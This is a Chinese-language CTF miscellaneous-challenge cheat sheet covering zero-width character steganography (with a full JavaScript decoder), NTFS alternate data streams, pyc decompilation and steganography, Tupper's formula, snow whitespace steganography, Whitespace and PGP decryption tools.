<h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><h2 id="0x01-零宽字符隐写"><a href="#0x01-零宽字符隐写" class="headerlink" title="0x01 零宽字符隐写"></a>0x01 零宽字符隐写</h2><p>零宽度字符隐写术（Zero-Width Space Steganography），将隐藏消息编码和解码为不可打印&#x2F;可读字符。</p>
<figure class="highlight text"><table><tr><td class="code"><pre><code class="hljs text">字符包括：<br>零宽度空格（\u200b）<br>零宽度非连接符（\u200c）<br>零宽度连接符（\u200d）<br>从左至右书写标记（\u200e）<br>从右至左书写标记（\u200f）<br></code></pre></td></tr></table></figure>

<p>在线解密工具<br><a href="https://www.mzy0.com/ctftools/zerowidth1/">https://www.mzy0.com/ctftools/zerowidth1/</a><br><a href="http://330k.github.io/misc_tools/unicode_steganography.html">http://330k.github.io/misc_tools&#x2F;unicode_steganography.html</a><br><a href="https://offdev.net/demos/zwsp-steg-js">https://offdev.net/demos/zwsp-steg-js</a><br><a href="https://yuanfux.github.io/zero-width-web/">https://yuanfux.github.io/zero-width-web/</a><br><a href="http://www.atoolbox.net/Tool.php?Id=829">http://www.atoolbox.net/Tool.php?Id=829</a></p>
<p>python解密<br><a href="https://github.com/enodari/zwsp-steg-py">https://github.com/enodari/zwsp-steg-py</a></p>
<p>js解密</p>
<figure class="highlight js"><table><tr><td class="code"><pre><code class="hljs js"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> *  Zero-Width Unicode Character Steganography</span><br><span class="hljs-comment"> *  Copyright (c) 2015-2016 Kei Misawa</span><br><span class="hljs-comment"> *  This software is released under the MIT License.</span><br><span class="hljs-comment"> *  http://opensource.org/licenses/mit-license.php</span><br><span class="hljs-comment"> */</span><br>(<span class="hljs-keyword">function</span>(<span class="hljs-params"><span class="hljs-built_in">exports</span></span>)&#123;<br>  <span class="hljs-string">&#x27;use strict&#x27;</span>;<br>  <span class="hljs-keyword">var</span> chars = [];<br>  <span class="hljs-keyword">var</span> radix = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">var</span> codelengthText = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">var</span> codelengthBinary = <span class="hljs-number">0</span>;<br>  <span class="hljs-comment">/**</span><br><span class="hljs-comment">    Set characters of coded hidden text(zero width characters)</span><br><span class="hljs-comment">    args: string of zero width characters</span><br><span class="hljs-comment">    return: null</span><br><span class="hljs-comment">   */</span><br>  <span class="hljs-keyword">var</span> setUseChars = <span class="hljs-keyword">function</span>(<span class="hljs-params">newchars</span>)&#123;<br>    <span class="hljs-keyword">if</span>(newchars.<span class="hljs-property">length</span> &gt;= <span class="hljs-number">2</span>)&#123;<br>      chars = newchars.<span class="hljs-title function_">split</span>(<span class="hljs-string">&#x27;&#x27;</span>);<br>      radix = chars.<span class="hljs-property">length</span>;<br>      codelengthText = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">ceil</span>(<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">log</span>(<span class="hljs-number">65536</span>) / <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">log</span>(radix));<br>      codelengthBinary = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">ceil</span>(<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">log</span>(<span class="hljs-number">256</span>) / <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">log</span>(radix));<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>  &#125;;<br>  <span class="hljs-comment">/**</span><br><span class="hljs-comment">    Text Encoder</span><br><span class="hljs-comment">    args:</span><br><span class="hljs-comment">      text: original text to be embedded (String)</span><br><span class="hljs-comment">      data: text to be hidden (String)</span><br><span class="hljs-comment">    return: unicode stego text</span><br><span class="hljs-comment">   */</span><br>  <span class="hljs-keyword">var</span> encodeText = <span class="hljs-keyword">function</span>(<span class="hljs-params">text1, text2</span>)&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_">combine_shuffle_string</span>(text1, <span class="hljs-title function_">encode_to_zerowidth_characters_text</span>(text2), codelengthText);<br>  &#125;;<br>  <span class="hljs-comment">/**</span><br><span class="hljs-comment">    Binary Encoder</span><br><span class="hljs-comment">    args:</span><br><span class="hljs-comment">      text: original text to be embedded (String)</span><br><span class="hljs-comment">      data: data to be hidden (Uint8Array)</span><br><span class="hljs-comment">    return: unicode stego text</span><br><span class="hljs-comment">   */</span><br>  <span class="hljs-keyword">var</span> encodeBinary = <span class="hljs-keyword">function</span>(<span class="hljs-params">text, data</span>)&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_">combine_shuffle_string</span>(text, <span class="hljs-title function_">encode_to_zerowidth_characters_binary</span>(data), codelengthBinary);<br>  &#125;;<br><br>  <span class="hljs-comment">/**</span><br><span class="hljs-comment">    Text Decoder</span><br><span class="hljs-comment">    args: unicode text with steganography (String)</span><br><span class="hljs-comment">    return: JavaScript Object &#123;</span><br><span class="hljs-comment">      originalText: original text (String),</span><br><span class="hljs-comment">      hiddenText: hidden data (String)</span><br><span class="hljs-comment">    &#125;</span><br><span class="hljs-comment">   */</span><br>  <span class="hljs-keyword">var</span> decodeText = <span class="hljs-keyword">function</span>(<span class="hljs-params">text</span>)&#123;<br>    <span class="hljs-keyword">var</span> splitted = <span class="hljs-title function_">split_zerowidth_characters</span>(text);<br><br>    <span class="hljs-keyword">return</span> &#123;<br>      <span class="hljs-string">&#x27;originalText&#x27;</span>: splitted.<span class="hljs-property">originalText</span>,<br>      <span class="hljs-string">&#x27;hiddenText&#x27;</span>: <span class="hljs-title function_">decode_from_zero_width_characters_text</span>(splitted.<span class="hljs-property">hiddenText</span>, codelengthText)<br>    &#125;;<br>  &#125;;<br>  <span class="hljs-comment">/**</span><br><span class="hljs-comment">    Binary Decoder</span><br><span class="hljs-comment">    args: unicode text with steganography (String)</span><br><span class="hljs-comment">    return: JavaScript Object &#123;</span><br><span class="hljs-comment">      originalText: original text (String),</span><br><span class="hljs-comment">      hiddenData: hidden data (Uint8Array)</span><br><span class="hljs-comment">    &#125;</span><br><span class="hljs-comment">   */</span><br>  <span class="hljs-keyword">var</span> decodeBinary = <span class="hljs-keyword">function</span>(<span class="hljs-params">text</span>)&#123;<br>    <span class="hljs-keyword">var</span> splitted = <span class="hljs-title function_">split_zerowidth_characters</span>(text);<br><br>    <span class="hljs-keyword">return</span> &#123;<br>      <span class="hljs-string">&#x27;originalText&#x27;</span>: splitted.<span class="hljs-property">originalText</span>,<br>      <span class="hljs-string">&#x27;hiddenData&#x27;</span>: <span class="hljs-title function_">decode_from_zero_width_characters_binary</span>(splitted.<span class="hljs-property">hiddenText</span>)<br>    &#125;;<br>  &#125;;<br><br>  <span class="hljs-title function_">setUseChars</span>(<span class="hljs-string">&#x27;\u200c\u200d\u202c\ufeff&#x27;</span>);<br><br>  <span class="hljs-built_in">exports</span>.<span class="hljs-property">unicodeSteganographer</span> = &#123;<br>    <span class="hljs-attr">encodeText</span>: encodeText,<br>    <span class="hljs-attr">decodeText</span>: decodeText,<br>    <span class="hljs-attr">encodeBinary</span>: encodeBinary,<br>    <span class="hljs-attr">decodeBinary</span>: decodeBinary,<br>    <span class="hljs-attr">setUseChars</span>: setUseChars<br>  &#125;;<br><br>  <span class="hljs-comment">/**</span><br><span class="hljs-comment">    Internal Functions</span><br><span class="hljs-comment">  */</span><br>  <span class="hljs-keyword">var</span> encode_to_zerowidth_characters_text = <span class="hljs-keyword">function</span>(<span class="hljs-params">str1</span>)&#123;<br>    <span class="hljs-keyword">var</span> result = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Array</span>(str1.<span class="hljs-property">length</span>);<br>    <span class="hljs-keyword">var</span> base = <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-keyword">var</span> i;<br>    <span class="hljs-keyword">var</span> c;<br>    <span class="hljs-keyword">var</span> d;<br>    <span class="hljs-keyword">var</span> r;<br><br>    <span class="hljs-comment">//var base = &#x27;0&#x27;.repeat(codelength); // IE not support this method</span><br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; codelengthText; i++)&#123;<br>      base += <span class="hljs-string">&#x27;0&#x27;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; str1.<span class="hljs-property">length</span>; i++)&#123;<br>      c = str1.<span class="hljs-title function_">charCodeAt</span>(i);<br>      d = c.<span class="hljs-title function_">toString</span>(radix);<br><br>      result[i] = (base + d).<span class="hljs-title function_">substr</span>(-codelengthText);<br>    &#125;<br><br>    r = result.<span class="hljs-title function_">join</span>(<span class="hljs-string">&#x27;&#x27;</span>);<br><br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; radix; i++)&#123;<br>      r = r.<span class="hljs-title function_">replace</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">RegExp</span>(i, <span class="hljs-string">&#x27;g&#x27;</span>), chars[i]);<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> r;<br>  &#125;;<br>  <span class="hljs-keyword">var</span> encode_to_zerowidth_characters_binary = <span class="hljs-keyword">function</span>(<span class="hljs-params">u8ary</span>)&#123;<br>    <span class="hljs-keyword">var</span> result = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Array</span>(u8ary.<span class="hljs-property">length</span>);<br>    <span class="hljs-keyword">var</span> base = <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-keyword">var</span> i;<br>    <span class="hljs-keyword">var</span> c;<br>    <span class="hljs-keyword">var</span> d;<br>    <span class="hljs-keyword">var</span> r;<br><br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; codelengthBinary; i++)&#123;<br>      base += <span class="hljs-string">&#x27;0&#x27;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; u8ary.<span class="hljs-property">length</span>; i++)&#123;<br>      d = u8ary[i].<span class="hljs-title function_">toString</span>(radix);<br>      result[i] = (base + d).<span class="hljs-title function_">substr</span>(-codelengthBinary);<br>    &#125;<br><br>    r = result.<span class="hljs-title function_">join</span>(<span class="hljs-string">&#x27;&#x27;</span>);<br><br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; radix; i++)&#123;<br>      r = r.<span class="hljs-title function_">replace</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">RegExp</span>(i, <span class="hljs-string">&#x27;g&#x27;</span>), chars[i]);<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> r;<br>  &#125;;<br>  <span class="hljs-keyword">var</span> combine_shuffle_string = <span class="hljs-keyword">function</span>(<span class="hljs-params">str1, str2, codelength</span>)&#123;<br>    <span class="hljs-keyword">var</span> result = [];<br>    <span class="hljs-keyword">var</span> c0 = str1.<span class="hljs-title function_">split</span>(<span class="hljs-regexp">/([\u0000-\u002F\u003A-\u0040\u005b-\u0060\u007b-\u007f])|([\u0030-\u0039]+)|([\u0041-\u005a\u0061-\u007a]+)|([\u0080-\u00FF]+)|([\u0100-\u017F]+)|([\u0180-\u024F]+)|([\u0250-\u02AF]+)|([\u02B0-\u02FF]+)|([\u0300-\u036F]+)|([\u0370-\u03FF]+)|([\u0400-\u04FF]+)|([\u0500-\u052F]+)|([\u0530-\u058F]+)|([\u0590-\u05FF]+)|([\u0600-\u06FF]+)|([\u0700-\u074F]+)|([\u0750-\u077F]+)|([\u0780-\u07BF]+)|([\u07C0-\u07FF]+)|([\u0800-\u083F]+)|([\u0840-\u085F]+)|([\u08A0-\u08FF]+)|([\u0900-\u097F]+)|([\u0980-\u09FF]+)|([\u0A00-\u0A7F]+)|([\u0A80-\u0AFF]+)|([\u0B00-\u0B7F]+)|([\u0B80-\u0BFF]+)|([\u0C00-\u0C7F]+)|([\u0C80-\u0CFF]+)|([\u0D00-\u0D7F]+)|([\u0D80-\u0DFF]+)|([\u0E00-\u0E7F]+)|([\u0E80-\u0EFF]+)|([\u0F00-\u0FFF]+)|([\u1000-\u109F]+)|([\u10A0-\u10FF]+)|([\u1100-\u11FF]+)|([\u1200-\u137F]+)|([\u1380-\u139F]+)|([\u13A0-\u13FF]+)|([\u1400-\u167F]+)|([\u1680-\u169F]+)|([\u16A0-\u16FF]+)|([\u1700-\u171F]+)|([\u1720-\u173F]+)|([\u1740-\u175F]+)|([\u1760-\u177F]+)|([\u1780-\u17FF]+)|([\u1800-\u18AF]+)|([\u18B0-\u18FF]+)|([\u1900-\u194F]+)|([\u1950-\u197F]+)|([\u1980-\u19DF]+)|([\u19E0-\u19FF]+)|([\u1A00-\u1A1F]+)|([\u1A20-\u1AAF]+)|([\u1AB0-\u1AFF]+)|([\u1B00-\u1B7F]+)|([\u1B80-\u1BBF]+)|([\u1BC0-\u1BFF]+)|([\u1C00-\u1C4F]+)|([\u1C50-\u1C7F]+)|([\u1CC0-\u1CCF]+)|([\u1CD0-\u1CFF]+)|([\u1D00-\u1D7F]+)|([\u1D80-\u1DBF]+)|([\u1DC0-\u1DFF]+)|([\u1E00-\u1EFF]+)|([\u1F00-\u1FFF]+)|([\u2000-\u206F]+)|([\u2070-\u209F]+)|([\u20A0-\u20CF]+)|([\u20D0-\u20FF]+)|([\u2100-\u214F]+)|([\u2150-\u218F]+)|([\u2190-\u21FF]+)|([\u2200-\u22FF]+)|([\u2300-\u23FF]+)|([\u2400-\u243F]+)|([\u2440-\u245F]+)|([\u2460-\u24FF]+)|([\u2500-\u257F]+)|([\u2580-\u259F]+)|([\u25A0-\u25FF]+)|([\u2600-\u26FF]+)|([\u2700-\u27BF]+)|([\u27C0-\u27EF]+)|([\u27F0-\u27FF]+)|([\u2800-\u28FF]+)|([\u2900-\u297F]+)|([\u2980-\u29FF]+)|([\u2A00-\u2AFF]+)|([\u2B00-\u2BFF]+)|([\u2C00-\u2C5F]+)|([\u2C60-\u2C7F]+)|([\u2C80-\u2CFF]+)|([\u2D00-\u2D2F]+)|([\u2D30-\u2D7F]+)|([\u2D80-\u2DDF]+)|([\u2DE0-\u2DFF]+)|([\u2E00-\u2E7F]+)|([\u2E80-\u2EFF]+)|([\u2F00-\u2FDF]+)|([\u2FF0-\u2FFF]+)|([\u3000-\u303F]+)|([\u3040-\u309F]+)|([\u30A0-\u30FF]+)|([\u3100-\u312F]+)|([\u3130-\u318F]+)|([\u3190-\u319F]+)|([\u31A0-\u31BF]+)|([\u31C0-\u31EF]+)|([\u31F0-\u31FF]+)|([\u3200-\u32FF]+)|([\u3300-\u33FF]+)|([\u3400-\u4DBF]+)|([\u4DC0-\u4DFF]+)|([\u4E00-\u9FFF]+)|([\uA000-\uA48F]+)|([\uA490-\uA4CF]+)|([\uA4D0-\uA4FF]+)|([\uA500-\uA63F]+)|([\uA640-\uA69F]+)|([\uA6A0-\uA6FF]+)|([\uA700-\uA71F]+)|([\uA720-\uA7FF]+)|([\uA800-\uA82F]+)|([\uA830-\uA83F]+)|([\uA840-\uA87F]+)|([\uA880-\uA8DF]+)|([\uA8E0-\uA8FF]+)|([\uA900-\uA92F]+)|([\uA930-\uA95F]+)|([\uA960-\uA97F]+)|([\uA980-\uA9DF]+)|([\uA9E0-\uA9FF]+)|([\uAA00-\uAA5F]+)|([\uAA60-\uAA7F]+)|([\uAA80-\uAADF]+)|([\uAAE0-\uAAFF]+)|([\uAB00-\uAB2F]+)|([\uAB30-\uAB6F]+)|([\uAB70-\uABBF]+)|([\uABC0-\uABFF]+)|([\uAC00-\uD7AF]+)|([\uD7B0-\uD7FF]+)|([\uD800-\uDFFF]+)|([\uE000-\uF8FF]+)|([\uF900-\uFAFF]+)|([\uFB00-\uFB4F]+)|([\uFB50-\uFDFF]+)|([\uFE00-\uFE0F]+)|([\uFE10-\uFE1F]+)|([\uFE20-\uFE2F]+)|([\uFE30-\uFE4F]+)|([\uFE50-\uFE6F]+)|([\uFE70-\uFEFF]+)|([\uFF00-\uFFEF]+)|([\uFFF0-\uFFFF]+)/g</span>);<br>    <span class="hljs-keyword">var</span> c1 = [];<br>    <span class="hljs-keyword">var</span> i;<br>    <span class="hljs-keyword">var</span> j;<br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; c0.<span class="hljs-property">length</span>; i++)&#123;<br>      <span class="hljs-keyword">if</span>((<span class="hljs-keyword">typeof</span> c0[i] !== <span class="hljs-string">&#x27;undefined&#x27;</span>) &amp;&amp; (c0[i] !== <span class="hljs-string">&#x27;&#x27;</span>))&#123;<br>        c1.<span class="hljs-title function_">push</span>(c0[i]);<br>      &#125;<br>    &#125;<br>    <span class="hljs-keyword">var</span> c2 = str2.<span class="hljs-title function_">split</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">RegExp</span>(<span class="hljs-string">&#x27;(.&#123;&#x27;</span> + codelength + <span class="hljs-string">&#x27;&#125;)&#x27;</span>, <span class="hljs-string">&#x27;g&#x27;</span>));<br>    <span class="hljs-keyword">var</span> ratio = c1.<span class="hljs-property">length</span> / (c1.<span class="hljs-property">length</span> + c2.<span class="hljs-property">length</span>);<br><br>    <span class="hljs-comment">/* slow</span><br><span class="hljs-comment">    while((c1.length &gt; 0) &amp;&amp; (c2.length &gt; 0))&#123;</span><br><span class="hljs-comment">      if(Math.random() &lt;= ratio)&#123;</span><br><span class="hljs-comment">        result.push(c1.shift());</span><br><span class="hljs-comment">      &#125;else&#123;</span><br><span class="hljs-comment">        result.push(c2.shift());</span><br><span class="hljs-comment">      &#125;</span><br><span class="hljs-comment">    &#125;*/</span><br>    i = <span class="hljs-number">0</span>;<br>    j = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span>((i &lt; c1.<span class="hljs-property">length</span>) &amp;&amp; (j &lt; c2.<span class="hljs-property">length</span>))&#123;<br>      <span class="hljs-keyword">if</span>(<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() &lt;= ratio)&#123;<br>        result.<span class="hljs-title function_">push</span>(c1[i]);<br>        i++;<br>      &#125;<span class="hljs-keyword">else</span>&#123;<br>        result.<span class="hljs-title function_">push</span>(c2[j]);<br>        j++;<br>      &#125;<br>    &#125;<br>    c1 = c1.<span class="hljs-title function_">slice</span>(i);<br>    c2 = c2.<span class="hljs-title function_">slice</span>(j);<br><br>    result = result.<span class="hljs-title function_">concat</span>(c1).<span class="hljs-title function_">concat</span>(c2);<br><br>    <span class="hljs-keyword">return</span> result.<span class="hljs-title function_">join</span>(<span class="hljs-string">&#x27;&#x27;</span>);<br>  &#125;;<br>  <span class="hljs-keyword">var</span> split_zerowidth_characters = <span class="hljs-keyword">function</span>(<span class="hljs-params">str1</span>)&#123;<br>    <span class="hljs-keyword">var</span> result = &#123;&#125;;<br>    result.<span class="hljs-property">originalText</span> = str1.<span class="hljs-title function_">replace</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">RegExp</span>(<span class="hljs-string">&#x27;[&#x27;</span> + chars.<span class="hljs-title function_">join</span>(<span class="hljs-string">&#x27;&#x27;</span>) + <span class="hljs-string">&#x27;]&#x27;</span>, <span class="hljs-string">&#x27;g&#x27;</span>), <span class="hljs-string">&#x27;&#x27;</span>);<br>    result.<span class="hljs-property">hiddenText</span> = str1.<span class="hljs-title function_">replace</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">RegExp</span>(<span class="hljs-string">&#x27;[^&#x27;</span> + chars.<span class="hljs-title function_">join</span>(<span class="hljs-string">&#x27;&#x27;</span>) + <span class="hljs-string">&#x27;]&#x27;</span>, <span class="hljs-string">&#x27;g&#x27;</span>), <span class="hljs-string">&#x27;&#x27;</span>);<br><br>    <span class="hljs-keyword">return</span> result;<br>  &#125;;<br>  <span class="hljs-keyword">var</span> decode_from_zero_width_characters_text = <span class="hljs-keyword">function</span>(<span class="hljs-params">str1</span>)&#123;<br>    <span class="hljs-keyword">var</span> r = str1;<br>    <span class="hljs-keyword">var</span> i;<br>    <span class="hljs-keyword">var</span> result = [];<br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; radix; i++)&#123;<br>      r = r.<span class="hljs-title function_">replace</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">RegExp</span>(chars[i], <span class="hljs-string">&#x27;g&#x27;</span>), i);<br>    &#125;<br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; r.<span class="hljs-property">length</span>; i += codelengthText)&#123;<br>      result.<span class="hljs-title function_">push</span>(<span class="hljs-title class_">String</span>.<span class="hljs-title function_">fromCharCode</span>(<span class="hljs-built_in">parseInt</span>(r.<span class="hljs-title function_">substr</span>(i, codelengthText), radix)));<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> result.<span class="hljs-title function_">join</span>(<span class="hljs-string">&#x27;&#x27;</span>);<br>  &#125;;<br>  <span class="hljs-keyword">var</span> decode_from_zero_width_characters_binary = <span class="hljs-keyword">function</span>(<span class="hljs-params">str1</span>)&#123;<br>    <span class="hljs-keyword">var</span> r = str1;<br>    <span class="hljs-keyword">var</span> i;<br>    <span class="hljs-keyword">var</span> j;<br>    <span class="hljs-keyword">var</span> result = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Uint8Array</span>(<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">ceil</span>(str1.<span class="hljs-property">length</span> / codelengthBinary));<br><br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; radix; i++)&#123;<br>      r = r.<span class="hljs-title function_">replace</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">RegExp</span>(chars[i], <span class="hljs-string">&#x27;g&#x27;</span>), i);<br>    &#125;<br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>, j = <span class="hljs-number">0</span>; i &lt; r.<span class="hljs-property">length</span>; i += codelengthBinary, j++)&#123;<br>      result[j] = <span class="hljs-built_in">parseInt</span>(r.<span class="hljs-title function_">substr</span>(i, codelengthBinary), radix);<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> result;<br>  &#125;;<br><br>  <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>&#125;)(<span class="hljs-variable language_">this</span>);<br><br><br><span class="hljs-keyword">var</span> s = unicodeSteganographer<br>s.<span class="hljs-title function_">setUseChars</span>(<span class="hljs-string">&#x27;\u200b\u200c\u200d\u200e\u200f&#x27;</span>);<br>s.<span class="hljs-title function_">decodeText</span>(<span class="hljs-string">&quot;我已经看见了，​​​​‎‏​​​​​‏​‍​​​​‏‍‌​​​​‏‍‏​​​​‎‏​​​​​‏‏‌​​​​‏‍‌​​​​‏‎‍​​​​‌‌‎​​​​‎‏‏​​​​‏‍‌​​​​‏‍​​​​​‏​‎​​​​‏‍‏​​​​‎‏‍​​​​‏‎‌​​​​‏‎‍​​​​‏‌‎​​​​‎‏‍​​​​‏‎‌​​​​‏​‌​​​‌​​​你呢？&quot;</span>)<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment">* 复制并使用代码请注明引用出处哦~</span><br><span class="hljs-comment">* Lazzaro @ https://lazzzaro.github.io</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure>

<h2 id="0x02-ntfs数据流隐写"><a href="#0x02-ntfs数据流隐写" class="headerlink" title="0x02 ntfs数据流隐写"></a>0x02 ntfs数据流隐写</h2><blockquote>
<p>NTFS交换数据流（alternate data streams，简称ADS）是NTFS磁盘格式的一个特性，在NTFS文件系统下，每个文件都可以存在多个数据流，就是说除了主文件流之外还可以有许多非主文件流寄宿在主文件流中。它使用资源派生来维持与文件相关的信息。————百度百科</p>
</blockquote>
<p>创建一个NTFS数据流<br><code>echo &quot;test&quot; &gt; 1.txt:2.txt</code></p>
<p>查看数据流<br>使用<code>NtfsStreamsEditor</code>(windows)工具或者<code>notepad</code>命令</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/summary/ntfs.jpg"></p>
<h2 id="0x03-pyc文件反编译"><a href="#0x03-pyc文件反编译" class="headerlink" title="0x03 pyc文件反编译"></a>0x03 pyc文件反编译</h2><p>一般使用<code>uncompyle6</code></p>
<p><code>uncompyle6 test.pyc &gt; test.py</code></p>
<h2 id="0x04-pyc隐写"><a href="#0x04-pyc隐写" class="headerlink" title="0x04 pyc隐写"></a>0x04 pyc隐写</h2><p>Stegosaurus 是一款隐写工具，它允许我们在 Python 字节码文件( pyc 或 pyo )中嵌入任意 Payload</p>
<p>github项目说是<code>Python 3.6 or later</code>，但是实际使用发现只有Python3.6可以运行</p>
<figure class="highlight text"><table><tr><td class="code"><pre><code class="hljs text">python3 stegosaurus.py -x [pyc_file]<br></code></pre></td></tr></table></figure>

<p>有时候需要注意<code>magic number</code>的问题<br>python3.6以下magic number是12个字节；python3.7以上是16个字节</p>
<h2 id="0x05-Tupper自我指涉公式"><a href="#0x05-Tupper自我指涉公式" class="headerlink" title="0x05 Tupper自我指涉公式"></a>0x05 Tupper自我指涉公式</h2><p>塔珀自指公式是杰夫·塔珀（Jeff Tupper）发现的自指公式：此公式的二维图像与公式本身外观一样。<br>该公式是一种对存储在常量k 中的位图信息进行解码的通用方法 ，它实际上可以用来绘制任何其他图像。</p>
<p>该不等式的定义为：<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/summary/Tupper.jpg"><br>其中 ⌊ ⌋ 表示楼层函数， mod 是模运算</p>
<p>根据k值不同，可以做出”任意”图像</p>
<p><a href="https://tuppers-formula.ovh/">Tupper’s Formula Tools</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> functools <span class="hljs-keyword">import</span> reduce<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Tuppers_Self_Referential_Formula</span>():<br>    k = <span class="hljs-number">4858450636189713423582095962494202044581400587983244549483093085061934704708809928450644769865524364849997247024915119110411605739177407856919754326571855442057210445735883681829823754139634338225199452191651284348332905131193199953502413758765239264874613394906870130562295813219481113685339535565290850023875092856892694555974281546386510730049106723058933586052544096664351265349363643957125565695936815184334857605266940161251266951421550539554519153785457525756590740540157929001765967965480064427829131488548259914721248506352686630476300</span><br>    <span class="hljs-comment"># 这里替换为你自己的K值</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">f</span>(<span class="hljs-params">x, y</span>):<br>        d = ((-<span class="hljs-number">17</span> * x) - (y % <span class="hljs-number">17</span>))<br>        e = reduce(<span class="hljs-keyword">lambda</span> x, y: x * y, [<span class="hljs-number">2</span> <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(-d)]) <span class="hljs-keyword">if</span> d <span class="hljs-keyword">else</span> <span class="hljs-number">1</span><br>        g = ((y // <span class="hljs-number">17</span>) // e) % <span class="hljs-number">2</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0.5</span> &lt; g<br><br>    <span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(k + <span class="hljs-number">16</span>, k - <span class="hljs-number">1</span>, -<span class="hljs-number">1</span>):<br>        line = <span class="hljs-string">&quot;&quot;</span><br>        <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">107</span>):<br>            <span class="hljs-keyword">if</span> f(x, y):<br>                line += <span class="hljs-string">&quot; ■&quot;</span><br>            <span class="hljs-keyword">else</span>:<br>                line += <span class="hljs-string">&quot;  &quot;</span><br>        <span class="hljs-built_in">print</span>(line)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    Tuppers_Self_Referential_Formula()<br></code></pre></td></tr></table></figure>


<h2 id="0x06-snow隐写"><a href="#0x06-snow隐写" class="headerlink" title="0x06 snow隐写"></a>0x06 snow隐写</h2><p>snow 隐写是在html嵌入隐写信息，它的原理是通过在文本文件的末尾嵌入空格和制表位的方式嵌入隐藏信息，不同空格与制表位的组合代表不同的嵌入信息。</p>
<p>snow加密的特征非常明显，它会生成大量的<code>20</code>，<code>09</code>，在预览的时候像雪花一样</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/summary/snow.png"></p>
<p><a href="http://fog.misty.com/perry/ccs/snow/snow/snow.html">snow在线</a></p>
<figure class="highlight text"><table><tr><td class="code"><pre><code class="hljs text">snow.exe -C -p password filename<br></code></pre></td></tr></table></figure>

<h2 id="0x07-whitespace"><a href="#0x07-whitespace" class="headerlink" title="0x07 whitespace"></a>0x07 whitespace</h2><p>white_space是一种编程语言<br>由”空格”，”回车”，”tab”组成</p>
<p><a href="https://vii5ard.github.io/whitespace/">whitespace ide</a></p>
<h2 id="0x08-PGP"><a href="#0x08-PGP" class="headerlink" title="0x08 PGP"></a>0x08 PGP</h2><blockquote>
<p>PGP 加密系统是采用公开密钥加密与传统密钥加密相结合的一种加密技术。它使用一对数学上相关的钥匙，其中一个（公钥）用来加密信息，另一个（私钥）用来解密信息。</p>
</blockquote>
<p>一般需要私钥文件<code>xxx.key</code>或<code>xxx.asc</code>，加密文件<code>xxx.pgp</code>和一个密码</p>
<p>PGPTool: <a href="https://pgptool.github.io/">https://pgptool.github.io/</a></p>
<p>例如[BSidesSF2019]bWF0cnlvc2hrYQ&#x3D;&#x3D;</p>
<p><code>Key ring-&gt;Import PGP Key-&gt;导入xxx.key-&gt;然后输入密码</code></p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/misc/pgp.jpg"></p>
<h2 id="0x09-otp"><a href="#0x09-otp" class="headerlink" title="0x09 otp"></a>0x09 otp</h2><p>有点偏向密码学，<a href="https://en.wikipedia.org/wiki/One-time_password">wiki</a></p>
